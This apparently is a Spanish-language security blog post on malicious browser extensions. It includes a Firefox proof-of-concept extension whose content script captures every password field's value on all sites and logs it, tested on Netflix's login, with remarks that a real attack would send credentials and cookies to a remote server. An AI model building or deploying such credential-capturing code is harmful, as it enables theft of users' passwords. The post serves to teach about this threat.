---
layout: post
title: Extensiones maliciosas capturando credenciales 
category: hacking,extension,web,javascript
permalink: "blog/extensiones-maliciosas"
published: yes
---



# Protegiendo tu navegador: Cómo las extensiones maliciosas pueden comprometer tus credenciales

Las extensiones del navegador, diseñadas para mejorar nuestra experiencia en línea pueden convertirse en una herramienta peligrosa si esta creada para propositos maliciosos.
Pueden usarse por ejemplo para:
* Robo de datos: Pueden capturar información posible sensible como contraseña y datos bancarios
* Seguimiento no autorizado: Rastrean la actividad de navegación del usuario sin su consentimiento
* Inyección de anuncios: Insertan publicidad no deseada en las páginas web visitadas.
* Botnet: Utilizan los recursos del navegador para actividades maliciosas en red

Estas extensiones aprovechan los permisos otorgados por el usuario para acceder a datos sensibles y realizar acciones no autorizadas.

### Prueba de Concepto - Ejemplo

Una prueba de concpeto básica podría involucrar la creación de una extensión para Firefox que observe los campos de contraseña. Un ejemplo simplificado:

1. Crea un nuevo directorio para tu extensión, ejemplo: Observer
2. Crea un archivo `manifest.json`
```js
{
  "manifest_version": 2,
  "name": "Password Observer",
  "version": "1.0",
  "description": "Observa campos de contraseña (solo para fines educativos)",
  "permissions": ["<all_urls>"],
  "content_scripts": [
    {
      "matches": ["<all_urls>"],
      "js": ["content.js"]
    }
  ]
}
```

3. Creamos un archivo `content.js` donde esta la lógica del código

```js
function observePasswords() {
  const passwordFields = document.querySelectorAll('input[type="password"]');
  
  passwordFields.forEach(field => {
    field.addEventListener('change', function(e) {
      console.log('Contraseña capturada:', e.target.value);
      // En un escenario real, aquí se enviarían los datos a un servidor externo
    });
  });
}

observePasswords();

// Observar cambios en el DOM para capturar campos añadidos dinámicamente
const observer = new MutationObserver(mutations => {
  for(let mutation of mutations) {
    if(mutation.type === 'childList') {
      observePasswords();
    }
  }
});

observer.observe(document.body, { childList: true, subtree: true });
```
Este código observa los campos de contraseña en la página y registra sus valores cuando cambian. En un escenario real de ataque, en lugar de usar console.log, se enviarían estos datos a un servidor externo.

> Para usar esta extensión en Firefox:

1. Abre Firefox y ve a about:debugging
2. Haz clic en "Este Firefox"
3. Haz clic en "Cargar complemento temporal..."
4. Selecciona el archivo manifest.json de tu extensión

![image](https://github.com/user-attachments/assets/03de74b1-9d51-49d1-99b1-d2bd8b2eb6cb)

![image](https://github.com/user-attachments/assets/7887e712-4f8a-4780-baa8-99a5672961b4)

Podemos verificar que la extensión esta habilitada , hacemos la prueba en una plataforma muy conocida de Streaming `Netflix` abrimos la consola de desarrollador con F12 e ingresamos cualquier usuario por ejemplo `test@gmail.com` y la contraseña `extension123!` Podemos ver que al momento de introducir la contraseña y enviar la solicitud nos captura la contraseña en el console.log() de la herramienta de desarrollador. Esto es posible sosfiticarla para capturar el email, cookies, password y enviarlo a un servidor remoto.

![image](https://github.com/user-attachments/assets/14d13568-2918-4781-be9d-afa7a1d49b87)


### Aviso

Es crucial enfatizar que el desarrollo o uso de herramientas para capturar credenciales sin autorización es ilegal y éticamente incorrecto. Esta información se proporciona únicamente con fines educativos para comprender mejor las amenazas de seguridad y cómo protegerse contra ellas.

Saludos.



